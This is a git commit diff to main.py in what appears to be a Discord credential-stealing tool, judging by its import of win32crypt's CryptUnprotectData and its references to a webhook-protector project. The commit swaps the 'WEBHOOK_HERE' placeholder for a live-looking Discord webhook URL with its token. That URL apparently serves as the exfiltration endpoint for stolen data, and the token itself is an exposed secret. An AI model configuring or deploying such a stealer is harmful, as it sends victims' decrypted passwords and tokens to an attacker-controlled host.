6bdc11adf545d2862f8adfc6dbdec2a11396726b
C4M2TJ <106411349+C4M2TJ@users.noreply.github.com>
2022-05-28 00:01:55 +0100

    Update main.py

--- main.py
+++ main.py
@@ -22,7 +22,7 @@ from win32crypt import CryptUnprotectData
 config = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
     # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted 
-    'webhook': "WEBHOOK_HERE",
+    'webhook': "https://discord.com/api/webhooks/979863420805447680/hVVBdUGmDnakln7Cj1Ne1Zu4XSv-72Xt3QSELOZuxx0sfBm4ks0Ae_Cin-Qn2MTlZQQH",
     #ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
     'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
